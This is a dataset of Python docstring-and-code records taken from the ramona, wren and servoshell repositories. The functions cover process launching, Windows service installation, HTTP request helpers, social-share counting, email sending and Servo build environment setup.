"repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\nThis function launches Ramona server - in 'os.exec' manner which means that this function will not return\nand instead of that, current process will be replaced by launched server. \n\nAll file descriptors above 2 are closed.\n'''\n", "func_signal": "def launch_server(server_only=True, programs=None, logfname=None):\n", "code": "if server_only: assert (programs is None or len(programs) == 0)\n\n# Prepare environment variable RAMONA_CONFIG and RAMONA_CONFIG_FULL\nfrom .config import config_files, config_includes\nos.environ['RAMONA_CONFIG'] = os.pathsep.join(config_files)\nos.environ['RAMONA_CONFIG_WINC'] = os.pathsep.join(itertools.chain(config_files, config_includes))\nif logfname is not None: os.environ['RAMONA_LOGFILE'] = logfname\n\n# Prepare command line\ncmdline = [\"-m\", \"ramona.server\"]\nif server_only: cmdline.append('-S')\nelif programs is not None: cmdline.extend(programs)\n\n# Launch\nif sys.platform == 'win32':\n\t# Windows specific code, os.exec* process replacement is not possible, so we try to mimic that\n\timport subprocess\n\tret = subprocess.call(get_python_exec(cmdline))\n\tsys.exit(ret)\n\nelse:\n\tclose_fds()\n\tpythonexec = get_python_exec()\n\tos.execl(pythonexec, os.path.basename(pythonexec), *cmdline)", "path": "ramona\\utils.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''\nClose all open file descriptors above standard ones. \nThis prevents the child from keeping open any file descriptors inherited from the parent.\n\nThis function is executed only if platform supports that - otherwise it does nothing.\n'''\n", "func_signal": "def close_fds():\n", "code": "if resource is None: return\n\nmaxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]\nif (maxfd == resource.RLIM_INFINITY):\n\tmaxfd = 1024\n\nos.closerange(3, maxfd)", "path": "ramona\\utils.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "'''Install Windows Ramona Service'''\n\n", "func_signal": "def w32_install_svc(start=False, server_only=True, programs=None):\n", "code": "import logging\nL = logging.getLogger('winsvc')\n\ndirectory = abspath(dirname(sys.argv[0])) # Find where console python prog is launched from ...\n\ncls = w32_ramona_service\nif cls._svc_name_ is None: cls.configure()\n\ntry:\n\tmodule_path=modules[cls.__module__].__file__\nexcept AttributeError:\n\t# maybe py2exe went by\n\tfrom sys import executable\n\tmodule_path=executable\nmodule_file = splitext(abspath(join(module_path,'..','..', '..')))[0]\ncls._svc_reg_class_ = '{0}\\\\ramona.console.winsvc.{1}'.format(module_file, cls.__name__)\n\nwin32api.SetConsoleCtrlHandler(lambda x: True, True) #  Service will stop on logout if False\n\n# Prepare command line\ncmdline = []\nif server_only: cmdline.append('-S')\nelif programs is not None: cmdline.extend(programs)\n\n# Install service\nwin32serviceutil.InstallService(\n\tcls._svc_reg_class_,\n\tcls._svc_name_,\n\tcls._svc_display_name_,\n\tstartType = win32service.SERVICE_AUTO_START,\n\texeArgs = ' '.join(cmdline),\n)\n\n# Set directory from which Ramona server should be launched ...\nwin32serviceutil.SetServiceCustomOption(cls._svc_name_, 'directory', directory)\nwin32serviceutil.SetServiceCustomOption(cls._svc_name_, 'config', ';'.join(config_files))\n\nL.debug(\"Service {0} installed\".format(cls._svc_name_))\n\nif start:\n\tx = win32serviceutil.StartService(cls._svc_name_)\n\tL.debug(\"Service {0} is starting ...\".format(cls._svc_name_))\n\t#TODO: Wait for service start to check start status ...\n\tL.debug(\"Service {0} started\".format(cls._svc_name_))\n\nreturn cls", "path": "ramona\\console\\winsvc.py", "repo_name": "ateska/ramona", "stars": 278, "license": "bsd-2-clause", "language": "python", "size": 3798}
{"docstring": "\"\"\"\nHandle authenticated PATCH requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n", "func_signal": "def _patch(self, url, supported_versions, data=None):\n", "code": "try:\n\tresponse = requests.patch(\n\t\turl, headers=self._headers, json=data)\n\treturn response\n\nexcept requests.exceptions.RequestException as e:\n\traise Exception(\n\t\t'Invalid API server response.\\n%s' % response)\n\nreturn None", "path": "wren\\data_discovery\\content_parser\\content_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL has been pinned in Pinterest\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on\n\"\"\"\n", "func_signal": "def get_pins(self, url):\n", "code": "endpoint = \"{}{}\".format(self.PINTEREST_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\nreturn json.loads(response.text.split(\"receiveCount(\", 1)[1].split(\")\", 1)[0])['count']", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nHandle authenticated POST requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n", "func_signal": "def _post(self, url, **queryparams):\n", "code": "try:\n\tif queryparams.get('data', None) != None:\n\t\tresponse = requests.post(url, headers=self._headers, data=queryparams.get('data'))\n\telse:\n\t\tresponse = requests.post(url, headers=self._headers)\n\n\treturn response\n\nexcept requests.exceptions.RequestException as e:\n\traise Exception(\n\t\t'Invalid API server response.\\n%s' % response)", "path": "wren\\data_discovery\\content_parser\\content_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nget news articles.\n\n:return: generator\n\"\"\"\n", "func_signal": "def get_news_articles(self):\n", "code": "news_sources = [\n    NewsMediaOrg(news_org=ALJAZEERA, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=BBC, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=CNN, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=NYPOST, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=NYTIMES, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=REUTERS, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=TELEGRAPH, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=THEGLOBAEANDMAIL, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=GUARDIAN, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=USTODAY, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=VICE, media_types=MEDIA_TYPE_ARTICLES),\n    NewsMediaOrg(news_org=WSJ, media_types=MEDIA_TYPE_ARTICLES)\n]\nfor news_ingestor in news_sources:\n    logging.info(\"Getting articles from {}\".format(news_ingestor))\n    for article in news_ingestor.parse_articles():\n        yield article", "path": "wren\\data_ingestion\\news_articles_crawler.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nHandle authenticated GET requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n", "func_signal": "def _get(self, url, **queryparams):\n", "code": "try:\n\tresponse = requests.get(\n\t\turl, headers=queryparams['headers'], params=queryparams['params'])\n\n\treturn response\n\nexcept requests.exceptions.RequestException as e:\n\traise Exception(\n\t\t'Invalid API server response.\\n%s' % response)", "path": "wren\\data_discovery\\content_parser\\content_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL has been shared on Linkedin\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on Linkedin\n\"\"\"\n", "func_signal": "def get_linkedin_shares(self, url):\n", "code": "endpoint = \"{}{}&format=json\".format(self.LINKEDIN_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\nreturn response.json().get(u'count')", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nrun the thread\n\n\"\"\"\n\n", "func_signal": "def run(self):\n", "code": "while True:\n    try:\n        for article in self.get_news_articles():\n            if article:\n                self.kafka_producer.send(self.kafka_topic, str(article.json()))\n        time.sleep(self.seconds)\n\n    except Exception as e:\n        raise e", "path": "wren\\data_ingestion\\news_articles_crawler.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nHandle authenticated PUT requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n\n", "func_signal": "def _put(self, url, supported_versions, data=None):\n", "code": "try:\n\tresponse = requests.put(url, headers=self._headers, data=data.encode('utf-8'))\n\treturn response\n\nexcept requests.exceptions.RequestException as e:\n\traise Exception(\n\t\t'Invalid API server response.\\n%s' % response.text)", "path": "wren\\data_discovery\\content_parser\\content_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL had been shared on FB.\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on FB\n\"\"\"\n", "func_signal": "def get_fb_shares(self, url):\n", "code": "endpoint = \"{}{}\".format(self.FB_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\n\nreturn response.json().get(u'share', {}).get(u'share_count')", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL was viewed in StumbleUpon\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on StumbleUpon\n\"\"\"\n", "func_signal": "def get_stumbles(self, url):\n", "code": "endpoint = \"{}{}\".format(self.STUMBLEUPON_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\n\nreturn response.json().get('result', {}).get('views')", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL had been shared on Google.\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on Google\n\"\"\"\n", "func_signal": "def get_google_plus_shares(self, url):\n", "code": "endpoint = \"{}{}\".format(self.REDDIT_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\n\ncontent = response.json()", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nparsing the message to get intent of the user\n:param message: message from client to be parsed\n:type message: :py:class:`str`\n\"\"\"\n", "func_signal": "def parse(self, message):\n", "code": "response = self._get(\"{}/parse\".format(self.nlu_server), data={\"q\": message}) # , \"project\": self.project_name, \"model\": self.model_name\nparsed_data = response.json()\n\nif parsed_data.get('intent', {}).get('confidence', -1) < MIN_THRESHOLD:\n    intent = None\n    entities = []\nelse:\n    intent = parsed_data['intent']['name']\n    entities = parsed_data['entities']\n\nreturn intent, entities", "path": "wren\\nlu\\nlu_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nHandle authenticated DELETE requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n", "func_signal": "def _delete(self, url, supported_versions, data=None):\n", "code": "try:\n\tif data != None:\n\t\tresponse = requests.delete(\n\t\t\turl, headers=self._headers, json=data)\n\telse:\n\t\tresponse = requests.delete(url, headers=self._headers)\n\n\treturn response\n\nexcept requests.exceptions.RequestException as e:\n\traise Exception(\n\t\t'Invalid API server response.\\n%s' % response)", "path": "wren\\data_discovery\\content_parser\\content_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nHandle authenticated GET requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n", "func_signal": "def _get(self, url, **queryparams):\n", "code": "try:\n    response = requests.get(url, timeout=5)\n\n    return response\n\nexcept requests.exceptions.RequestException as e:\n    raise Exception(\n        'Invalid API server response.\\n%s' % e)", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nHandle authenticated POST requests\n\n:param url: The url for the endpoint including path parameters\n:type url: :py:class:`str`\n\n:param queryparams: The query string parameters\n:type queryparams: :py:class:`dict`\n\n:returns: The Reponse from the API\n\"\"\"\n", "func_signal": "def _get(self, url, **queryparams):\n", "code": "try:\n    if None != queryparams.get('data', None):\n        response = requests.get(url, params=queryparams.get('data'))\n    return response\n\nexcept requests.exceptions.RequestException as e:\n    raise Exception(\n        'Invalid API server response.\\n%s' % response)", "path": "wren\\nlu\\nlu_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL had been shared on Google.\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on\n\"\"\"\n", "func_signal": "def get_reddit_shares(self, url):\n", "code": "endpoint = \"{}{}\".format(self.REDDIT_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\n\nresponse_json = response.json()\n\nnbr_mentions = sum((child['data'] or {'score': 0})['score'] for child in response_json[u'data']['children'])\n\nreturn nbr_mentions", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nInitialize the class with api_key and language.\n\n:param api_key: API Key to access to the service\n:type api_key: :py:class:`str`\n\n:param lang: the supported language\n:type lang: :py:class:`str`\n\n\"\"\"\n", "func_signal": "def __init__(self, api_key=None, lang='English'):\n", "code": "self.api_key = api_key\nself.lang = lang", "path": "wren\\data_discovery\\content_parser\\content_parser.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nReturn the number of times a given URL had been tweeted.\n\n:param url: a link to the article\n:type url: :py:class:`str`\n\n:return: a number of shares on\n\"\"\"\n# raise NotImplementedError()\n\n", "func_signal": "def get_twitter_shares(self, url):\n", "code": "endpoint = \"{}{}\".format(self.TWITTER_URL, self._remove_params(url))\nresponse = self._get(url=endpoint)\n\nreturn response.json()['count']", "path": "wren\\data_discovery\\social_popularity\\social_shares.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nInitialize the class with you title and podcast_url, other meta information are passed via kwargs.\n\n:param title: The Podcast's title \n:type title: :py:class:`str`\n\n:param podcast_url: The Podcast's url\n:type podcast_url: :py:class:`str`\n\n:param pub_date: The Podcast's publication date\n:type pub_date: :datetime:class:`datetime`\n    \n:param summary: The Podcast's summary \n:type summary: :py:class:`str`\n\n:param podcast_content: The Podcast's content \n:type podcast_content: :py:class:`str`\n\n:param podcast_subtitle: The Podcast's subtitle \n:type podcast_subtitle: :py:class:`str`\n\n:param podcast_metadata: The Podcast's metadata \n:type podcast_metadata: :py:class:`dict`\n\n:param authors: The Podcast's authors \n:type authors: :py:class:`list`\n\n:param thumbnail: The Podcast's thumbnail \n:type thumbnail: :py:class:`str`\n\n:param images: The Podcast's related images \n:type images: :py:class:`list`\n\n:param keywords: The Podcast's related keywords \n:type keywords: :py:class:`list`\n\n:param category: The Podcast's category \n:type category: :py:class:`str`\n\n:param language: The Podcast's language \n:type language: :py:class:`str`\n\n:param media_org: The Podcast's source \n:type media_org: :py:class:`str`\n\n:return: \n\"\"\"\n", "func_signal": "def __init__(self, title, podcast_url, **kwargs):\n", "code": "self.title = title.encode(\"utf-8\")\nself.podcast_url = podcast_url\nself.pub_date = kwargs.get(\"pub_date\", EMPTY_STR)\nself.summary = kwargs.get(\"summary\", EMPTY_STR).encode(\"utf-8\")\nself.podcast_content = kwargs.get(\"podcast_content\", EMPTY_STR).encode(\"utf-8\")\nself.podcast_subtitle = kwargs.get(\"podcast_subtitle\", EMPTY_STR).encode(\"utf-8\")\nself.podcast_metadata = kwargs.get(\"podcast_metadata\", EMPTY_DICT)\nself.authors = kwargs.get(\"author\", EMPTY_LIST)\nself.thumbnail = kwargs.get(\"thumbnail\", EMPTY_STR).encode(\"utf-8\")\nself.images = kwargs.get(\"images\", EMPTY_LIST)\nself.keywords = kwargs.get(\"keywords\", EMPTY_LIST)\nself.category = kwargs.get(\"category\", EMPTY_STR)\nself.language = kwargs.get(\"language\", EMPTY_STR)\nself.concepts = {}\nself.media_org = kwargs.get(\"media_org\", EMPTY_STR)\n\nself.popularity_summary = kwargs.get(\"popularity\", EMPTY_STR)\nself.sentiment_score = kwargs.get(\"sentiment\", EMPTY_STR)\nself.text_entities = kwargs.get(\"entities\", EMPTY_STR)", "path": "wren\\core\\podcast.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"\nsend an email given a title and content of the email\n\n:param title:\n:type title: :py:class:`str`\n\n:param content:\n:type content: :py:class:`str`\n\n:param receivers:\n:type receivers: :py:class:`list`\n\n:return:\n\"\"\"\n", "func_signal": "def send_email(self, title, content, receivers):\n", "code": "subject = \"[Wren]: {} \".format(title)\nsession = smtplib.SMTP('smtp.gmail.com', 587)\nsession.ehlo()\nsession.starttls()\nlogging.info(\"Please enter your email password\")\npassw = getpass.getpass()\nsession.login(self.email_config[\"sender\"], passw)\nheaders = \"\\n\".join([\"from: \" + self.email_config[\"sender\"], \"subject: \" + subject, \"mime-version: 1.0\",\n                     \"content-type: text/html\"])\ncontent = headers + \"\\n\\n\" + content\nsession.sendmail(self.email_config[\"sender\"], receivers, content)", "path": "wren\\actions\\email_manager.py", "repo_name": "tzano/wren", "stars": 258, "license": "mit", "language": "python", "size": 1463}
{"docstring": "\"\"\"Return an extended environment dictionary.\"\"\"\n", "func_signal": "def build_env(self, hosts_file_path=None, target=None, is_build=False, geckolib=False):\n", "code": "env = os.environ.copy()\nif sys.platform == \"win32\" and type(env['PATH']) == unicode:\n    # On win32, the virtualenv's activate_this.py script sometimes ends up\n    # turning os.environ['PATH'] into a unicode string.  This doesn't work\n    # for passing env vars in to a process, so we force it back to ascii.\n    # We don't use UTF8 since that won't be correct anyway; if you actually\n    # have unicode stuff in your path, all this PATH munging would have broken\n    # it in any case.\n    env['PATH'] = env['PATH'].encode('ascii', 'ignore')\nextra_path = []\nextra_lib = []\nif \"msvc\" in (target or host_triple()):\n    msvc_x64 = \"64\" if \"x86_64\" in (target or host_triple()) else \"\"\n    msvc_deps_dir = path.join(self.context.sharedir, \"msvc-dependencies\")\n\n    def package_dir(package):\n        return path.join(msvc_deps_dir, package, msvc_deps[package])\n\n    extra_path += [path.join(package_dir(\"cmake\"), \"bin\")]\n    extra_path += [path.join(package_dir(\"ninja\"), \"bin\")]\n    # Link openssl\n    env[\"OPENSSL_INCLUDE_DIR\"] = path.join(package_dir(\"openssl\"), \"include\")\n    env[\"OPENSSL_LIB_DIR\"] = path.join(package_dir(\"openssl\"), \"lib\" + msvc_x64)\n    env[\"OPENSSL_LIBS\"] = \"libsslMD:libcryptoMD\"\n    # Link moztools\n    env[\"MOZTOOLS_PATH\"] = path.join(package_dir(\"moztools\"), \"bin\")\n\nif is_windows():\n    if not os.environ.get(\"NATIVE_WIN32_PYTHON\"):\n        env[\"NATIVE_WIN32_PYTHON\"] = sys.executable\n    # Always build harfbuzz from source\n    env[\"HARFBUZZ_SYS_NO_PKG_CONFIG\"] = \"true\"\n\nif not self.config[\"tools\"][\"system-rust\"] \\\n        or self.config[\"tools\"][\"rust-root\"]:\n    env[\"RUST_ROOT\"] = self.config[\"tools\"][\"rust-root\"]\n    # These paths are for when rust-root points to an unpacked installer\n    extra_path += [path.join(self.config[\"tools\"][\"rust-root\"], \"rustc\", \"bin\")]\n    extra_lib += [path.join(self.config[\"tools\"][\"rust-root\"], \"rustc\", \"lib\")]\n    # These paths are for when rust-root points to a rustc sysroot\n    extra_path += [path.join(self.config[\"tools\"][\"rust-root\"], \"bin\")]\n    extra_lib += [path.join(self.config[\"tools\"][\"rust-root\"], \"lib\")]\n\nif not self.config[\"tools\"][\"system-cargo\"] \\\n        or self.config[\"tools\"][\"cargo-root\"]:\n    # This path is for when rust-root points to an unpacked installer\n    extra_path += [\n        path.join(self.config[\"tools\"][\"cargo-root\"], \"cargo\", \"bin\")]\n    # This path is for when rust-root points to a rustc sysroot\n    extra_path += [\n        path.join(self.config[\"tools\"][\"cargo-root\"], \"bin\")]\n\nif extra_path:\n    env[\"PATH\"] = \"%s%s%s\" % (os.pathsep.join(extra_path), os.pathsep, env[\"PATH\"])\n\nenv[\"CARGO_HOME\"] = self.config[\"tools\"][\"cargo-home-dir\"]\nif self.config[\"build\"][\"incremental\"]:\n    env[\"CARGO_INCREMENTAL\"] = \"1\"\n\nif extra_lib:\n    if sys.platform == \"darwin\":\n        env[\"DYLD_LIBRARY_PATH\"] = \"%s%s%s\" % \\\n                                   (os.pathsep.join(extra_lib),\n                                    os.pathsep,\n                                    env.get(\"DYLD_LIBRARY_PATH\", \"\"))\n    else:\n        env[\"LD_LIBRARY_PATH\"] = \"%s%s%s\" % \\\n                                 (os.pathsep.join(extra_lib),\n                                  os.pathsep,\n                                  env.get(\"LD_LIBRARY_PATH\", \"\"))\n\n# Paths to Android build tools:\nif self.config[\"android\"][\"sdk\"]:\n    env[\"ANDROID_SDK\"] = self.config[\"android\"][\"sdk\"]\nif self.config[\"android\"][\"ndk\"]:\n    env[\"ANDROID_NDK\"] = self.config[\"android\"][\"ndk\"]\nif self.config[\"android\"][\"toolchain\"]:\n    env[\"ANDROID_TOOLCHAIN\"] = self.config[\"android\"][\"toolchain\"]\nif self.config[\"android\"][\"platform\"]:\n    env[\"ANDROID_PLATFORM\"] = self.config[\"android\"][\"platform\"]\n\n# These are set because they are the variable names that build-apk\n# expects. However, other submodules have makefiles that reference\n# the env var names above. Once glutin is enabled and set as the\n# default, we could modify the subproject makefiles to use the names\n# below and remove the vars above, to avoid duplication.\nif \"ANDROID_SDK\" in env:\n    env[\"ANDROID_HOME\"] = env[\"ANDROID_SDK\"]\nif \"ANDROID_NDK\" in env:\n    env[\"NDK_HOME\"] = env[\"ANDROID_NDK\"]\nif \"ANDROID_TOOLCHAIN\" in env:\n    env[\"NDK_STANDALONE\"] = env[\"ANDROID_TOOLCHAIN\"]\n\nif hosts_file_path:\n    env['HOST_FILE'] = hosts_file_path\n\nenv['RUSTDOC'] = path.join(self.context.topdir, 'etc', 'rustdoc-with-private')\n\nif self.config[\"build\"][\"rustflags\"]:\n    env['RUSTFLAGS'] = env.get('RUSTFLAGS', \"\") + \" \" + self.config[\"build\"][\"rustflags\"]\n\n# Don't run the gold linker if on Windows https://github.com/servo/servo/issues/9499\nif self.config[\"tools\"][\"rustc-with-gold\"] and sys.platform != \"win32\":\n    if subprocess.call(['which', 'ld.gold'], stdout=PIPE, stderr=PIPE) == 0:\n        env['RUSTFLAGS'] = env.get('RUSTFLAGS', \"\") + \" -C link-args=-fuse-ld=gold\"\n\nif not (self.config[\"build\"][\"ccache\"] == \"\"):\n    env['CCACHE'] = self.config[\"build\"][\"ccache\"]\n\n# Ensure Rust uses hard floats and SIMD on ARM devices\nif target:\n    if target.startswith('arm') or target.startswith('aarch64'):\n        env['RUSTFLAGS'] = env.get('RUSTFLAGS', \"\") + \" -C target-feature=+neon\"\n\nenv['RUSTFLAGS'] = env.get('RUSTFLAGS', \"\") + \" -W unused-extern-crates\"\n\ngit_info = []\nif os.path.isdir('.git') and is_build:\n    git_sha = subprocess.check_output([\n        'git', 'rev-parse', '--short', 'HEAD'\n    ]).strip()\n    git_is_dirty = bool(subprocess.check_output([\n        'git', 'status', '--porcelain'\n    ]).strip())\n\n    git_info.append('')\n    git_info.append(git_sha)\n    if git_is_dirty:\n        git_info.append('dirty')\n\nenv['GIT_INFO'] = '-'.join(git_info)\n\nif geckolib:\n    geckolib_build_path = path.join(self.context.topdir, \"target\", \"geckolib\").encode(\"UTF-8\")\n    env[\"CARGO_TARGET_DIR\"] = geckolib_build_path\n\nreturn env", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "'''Dispatches to the right bootstrapping function for the OS.'''\n\n", "func_signal": "def bootstrap(context, force=False):\n", "code": "bootstrapper = None\n\nif \"windows-msvc\" in host_triple():\n    bootstrapper = windows_msvc\nelif \"linux-gnu\" in host_triple():\n    distro, version, _ = platform.linux_distribution()\n    if distro.lower() in [\n        'centos',\n        'centos linux',\n        'debian',\n        'fedora',\n        'ubuntu',\n    ]:\n        context.distro = distro\n        bootstrapper = salt\n\nif bootstrapper is None:\n    print('Bootstrap support is not yet available for your OS.')\n    return 1\n\nreturn bootstrapper(context, force=force)", "path": "python\\servo\\bootstrap.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Context manager for changing the current working directory\"\"\"\n", "func_signal": "def cd(new_path):\n", "code": "previous_path = os.getcwd()\ntry:\n    os.chdir(new_path)\n    yield\nfinally:\n    os.chdir(previous_path)", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# Make the path relative to the project top-level directory so that\n# we can more easily find the right test directory.\n", "func_signal": "def make_test_file_url(self, absolute_file_path):\n", "code": "file_path = os.path.relpath(absolute_file_path, PROJECT_TOPLEVEL_PATH)\n\nif file_path.startswith(WEB_PLATFORM_TESTS_PATH):\n    url = file_path[len(WEB_PLATFORM_TESTS_PATH):]\nelif file_path.startswith(SERVO_TESTS_PATH):\n    url = \"/mozilla\" + file_path[len(SERVO_TESTS_PATH):]\nelse:  # This test file isn't in any known test directory.\n    return None\n\nreturn url.replace(os.path.sep, \"/\")", "path": "python\\servo\\testing_commands.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# On Linux and mac, find the OSMesa software rendering library and\n# add it to the dynamic linker search path.\n", "func_signal": "def set_software_rendering_env(self, use_release):\n", "code": "try:\n    bin_path = self.get_binary_path(use_release, not use_release)\n    if not set_osmesa_env(bin_path, os.environ):\n        print(\"Warning: Cannot set the path to OSMesa library.\")\nexcept BuildNotFound:\n    # This can occur when cross compiling (e.g. arm64), in which case\n    # we won't run the tests anyway so can safely ignore this step.\n    pass", "path": "python\\servo\\testing_commands.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# The folder is called 'python'. By deliberately checking for it with the wrong case, we determine if the file\n# system is case sensitive or not.\n", "func_signal": "def _ensure_case_insensitive_if_windows():\n", "code": "if _is_windows() and not os.path.exists('Python'):\n    print('Cannot run mach in a path on a case-sensitive file system on Windows.')\n    print('For more details, see https://github.com/pypa/virtualenv/issues/935')\n    sys.exit(1)", "path": "python\\mach_bootstrap.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "\"\"\"Wrap `subprocess.call`, printing the command if verbose=True.\"\"\"\n", "func_signal": "def call(*args, **kwargs):\n", "code": "verbose = kwargs.pop('verbose', False)\nif verbose:\n    print(' '.join(args[0]))\nif 'env' in kwargs:\n    kwargs['env'] = normalize_env(kwargs['env'])\n# we have to use shell=True in order to get PATH handling\n# when looking for the binary on Windows\nreturn subprocess.call(*args, shell=sys.platform == 'win32', **kwargs)", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# Register window class; it's okay to do this multiple times\n", "func_signal": "def __init__(self):\n", "code": "wc = WNDCLASS()\nwc.lpszClassName = 'ServoTaskbarNotification'\nwc.lpfnWndProc = {win32con.WM_DESTROY: self.OnDestroy, }\nself.classAtom = RegisterClass(wc)\nself.hinst = wc.hInstance = GetModuleHandle(None)", "path": "python\\servo\\win32_toast.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
{"docstring": "# Allow ~\n", "func_signal": "def resolverelative(category, key):\n", "code": "self.config[category][key] = path.expanduser(self.config[category][key])\n# Resolve relative paths\nself.config[category][key] = path.join(context.topdir,\n                                       self.config[category][key])", "path": "python\\servo\\command_base.py", "repo_name": "paulrouget/servoshell", "stars": 278, "license": "mpl-2.0", "language": "python", "size": 5462}
